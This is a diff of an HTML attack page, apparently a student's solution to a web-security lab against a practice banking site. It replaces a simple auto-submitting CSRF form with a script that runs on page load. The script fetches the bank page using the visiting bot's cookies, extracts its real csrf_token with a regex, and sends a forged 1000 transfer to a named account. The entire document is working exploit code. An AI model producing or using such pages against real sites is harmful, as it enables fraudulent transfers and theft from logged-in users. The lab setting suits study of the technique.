@@ -1,18 +1,26 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>You got phished!</title>
-</head>
 <body>
-    <form id="csrf-form" action="https://phish-me.quoccacorp.com/api/transfer" method="POST">
-        <input type="hidden" name="csrf_token" value="NTUwMg==">
-        <input type="hidden" name="username" value="z5625996">
-        <input type="hidden" name="amount" value="1000">
-    </form>
-
+    <h2>Stealing Token...</h2>
     <script>
-        // 当页面加载时，自动提交上述表单
-        document.getElementById('csrf-form').submit();
+        // 1. 携带 Bot 的 Cookie 跨域读取银行首页的 HTML
+        fetch('https://phish-me.quoccacorp.com/', {credentials: 'include'})
+        .then(response => response.text())
+        .then(html => {
+            // 2. 使用正则表达式从 Bot 看到的页面中提取它真实的 csrf_token
+            let match = html.match(/name="csrf_token" value="(.*?)"/);
+            if (match && match[1]) {
+                let botToken = match[1];
+                
+                // 3. 用窃取到的真实 Token 构造并发送转账请求
+                fetch('https://phish-me.quoccacorp.com/api/transfer', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                    body: 'csrf_token=' + encodeURIComponent(botToken) + '&username=z5625996&amount=1000',
+                    credentials: 'include'
+                });
+            }
+        });
     </script>
 </body>
 </html>
